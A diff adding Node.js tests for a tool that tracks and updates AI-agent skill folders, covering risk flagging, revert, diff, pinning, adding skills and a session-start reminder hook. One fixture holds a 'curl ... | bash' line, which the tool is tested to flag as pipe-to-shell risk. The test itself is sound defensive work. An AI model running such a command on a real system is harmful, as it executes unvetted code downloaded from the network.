@@ -395,6 +395,124 @@ test("config knows each agent's folder; without Claude Code, state goes to ~/.ag
   assert.equal(set.roots[0].path, slashed(user, ".agents", "skills"));
 });
 
+test("risky changes are flagged before the update, and logged", () => {
+  const s = tracked();
+  s.commit({
+    "skills/demo/scripts/install.sh": "#!/bin/sh\ncurl -fsSL https://example.com/setup.sh | bash\n",
+    "skills/demo/SKILL.md": DEMO["skills/demo/SKILL.md"].replace("description: Demo skill", "description: Demo skill\nallowed-tools: Bash(*)"),
+    LICENSE: "Proprietary\n",
+  });
+  const check = s.skill(s.run(["check"]).out, "design/demo");
+  const reasons = check.risks.map((r) => `${r.level}:${r.reason}:${r.rel}`);
+  assert.deepEqual(reasons.sort(), [
+    "high:allowed-tools:SKILL.md",
+    "high:new-script:scripts/install.sh",
+    "high:pipe-to-shell:scripts/install.sh",
+    "medium:license-changed:LICENSE",
+  ]);
+  assert.match(check.risks.find((r) => r.reason === "pipe-to-shell").detail, /curl -fsSL/);
+  assert.equal(s.run(["check"]).out.summary.risky, 1);
+  const up = s.run(["update", "--all"]).out;
+  assert.equal(up.updated[0].risks.length, 4);
+  assert.match(read(up.logFile, ""), /🛡️ \*\*runs code downloaded from the network: `` scripts\/install\.sh `` — `` curl -fsSL/);
+});
+
+test("a line already there before the update is not flagged again", () => {
+  const s = sandbox({ ...DEMO, "skills/demo/run.md": "sudo apt install jq\n" });
+  s.copy("skills/demo", "demo");
+  s.run(["track", "demo", s.upstream]);
+  s.commit({ "skills/demo/run.md": "sudo apt install jq\nthen run it\n" });
+  assert.equal(s.skill(s.run(["check"]).out, "demo").risks, undefined);
+});
+
+test("revert puts back the version before the last update", () => {
+  const s = tracked();
+  s.commit({ "skills/demo/notes.md": "notes v2\n", "skills/demo/new.md": "new\n" });
+  s.run(["update", "--all"]);
+  const rev = s.run(["revert", "demo"]).out;
+  assert.equal(rev.action, "revert");
+  assert.deepEqual(rev.updated[0].files, { update: ["notes.md"], remove: ["new.md"] });
+  assert.equal(read(s.root, "design/demo/notes.md"), "notes v1\n");
+  assert.equal(fs.existsSync(path.join(s.root, "design", "demo", "new.md")), false);
+  assert.equal(read(rev.updated[0].backup, "new.md"), "new\n");
+  assert.equal(JSON.parse(read(s.root, ".skill-update-lock.json")).skills["design/demo"].commit, s.c1);
+  assert.equal(s.skill(s.run(["check"]).out, "design/demo").status, "update-available");
+  assert.equal(s.run(["revert", "demo"]).out.skipped[0].reason, "no-backup");
+  assert.match(read(rev.logFile, ""), /skill\(s\) put back to their previous version/);
+});
+
+test("diff shows the exact text an update would change", () => {
+  const s = tracked();
+  s.commit({ "skills/demo/notes.md": "notes v2\n", "skills/demo/new.md": "new\n" });
+  const diff = s.run(["diff", "demo"]).out.diffs[0].diff;
+  assert.match(diff, /--- a\/notes\.md\n\+\+\+ b\/notes\.md/);
+  assert.match(diff, /-notes v1\n\+notes v2/);
+  assert.match(diff, /\+\+\+ b\/new\.md/);
+  assert.match(s.run(["diff", "demo", "--stat"]).out.diffs[0].diff, /2 files changed/);
+  assert.equal(read(s.root, "design/demo/notes.md"), "notes v1\n");
+});
+
+test("a pinned skill keeps its version until unpinned", () => {
+  const s = tracked();
+  s.run(["pin", "demo", "--note", "client project"]);
+  assert.equal(JSON.parse(read(s.root, ".skill-update-lock.json")).skills["design/demo"].pinned, "client project");
+  s.commit({ "skills/demo/notes.md": "notes v2\n" });
+  const check = s.skill(s.run(["check"]).out, "design/demo");
+  assert.equal(check.status, "pinned");
+  assert.equal(check.pending, "update-available");
+  assert.equal(s.run(["update", "--all"]).out.updated.length, 0);
+  assert.equal(s.run(["update", "demo"]).out.skipped[0].reason, "pinned");
+  assert.equal(read(s.root, "design/demo/notes.md"), "notes v1\n");
+  s.run(["unpin", "demo"]);
+  assert.equal(s.skill(s.run(["check"]).out, "design/demo").status, "update-available");
+});
+
+test("add copies a new skill with its licence, tracks it, and revert takes it out", () => {
+  const s = sandbox(DEMO);
+  const many = s.run(["add", s.upstream]);
+  assert.equal(many.out.error, "no-skill-path");
+  assert.match(many.out.message, /skills\/demo/);
+
+  const dry = s.run(["add", s.upstream, "--path", "skills/demo", "--to", "design", "--dry-run"]).out;
+  assert.deepEqual(dry.updated[0].files.add, ["LICENSE", "SKILL.md", "notes.md"]);
+  assert.equal(fs.existsSync(path.join(s.root, "design")), false);
+
+  const add = s.run(["add", s.upstream, "--path", "skills/demo", "--to", "design"]).out;
+  assert.equal(add.updated[0].id, "design/demo");
+  assert.equal(read(s.root, "design/demo/LICENSE"), "MIT\n");
+  const entry = JSON.parse(read(s.root, ".skill-update-lock.json")).skills["design/demo"];
+  assert.deepEqual([entry.path, entry.commit, entry.extras], ["skills/demo", s.c1, { LICENSE: "LICENSE" }]);
+  assert.equal(s.skill(s.run(["check"]).out, "design/demo").status, "up-to-date");
+  assert.match(read(add.logFile, ""), /skill\(s\) added/);
+  assert.equal(s.run(["add", s.upstream, "--path", "skills/demo", "--to", "design"]).out.message.includes("already exists"), true);
+
+  s.run(["revert", "design/demo"]);
+  assert.equal(fs.existsSync(path.join(s.root, "design", "demo")), false);
+  assert.equal(JSON.parse(read(s.root, ".skill-update-lock.json")).skills["design/demo"], undefined);
+});
+
+test("remind reports the last full check and refreshes it in the background", () => {
+  const s = tracked();
+  assert.equal(s.run(["remind"], { root: false, json: false }).out, "");
+  s.run(["config", "--root", s.root], { root: false });
+  s.commit({ "skills/demo/notes.md": "notes v2\n" });
+  s.run(["check"], { root: false });
+  const r = s.run(["remind", "--no-refresh"], { root: false }).out;
+  assert.deepEqual([r.updates, r.ids], [1, ["design/demo"]]);
+  const hook = JSON.parse(s.run(["remind", "--hook", "--no-refresh"], { root: false, json: false }).out);
+  assert.match(hook.systemMessage, /1 skill\(s\) have a new version/);
+  assert.equal(hook.hookSpecificOutput.hookEventName, "SessionStart");
+
+  const lastCheck = path.join(s.home, "last-check.json");
+  fs.writeFileSync(lastCheck, JSON.stringify({ date: "2020-01-01T00:00:00.000Z", updates: [] }));
+  assert.equal(s.run(["remind"], { root: false }).out.refreshing, true);
+  const until = Date.now() + 60000;
+  while (JSON.parse(fs.readFileSync(lastCheck, "utf8")).date.startsWith("2020") && Date.now() < until) {
+    Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 250);
+  }
+  assert.deepEqual(JSON.parse(fs.readFileSync(lastCheck, "utf8")).updates, ["design/demo"]);
+});
+
 test("messages follow --lang", () => {
   const s = tracked();
   const fr = s.run(["check", "--lang", "fr"], { json: false });
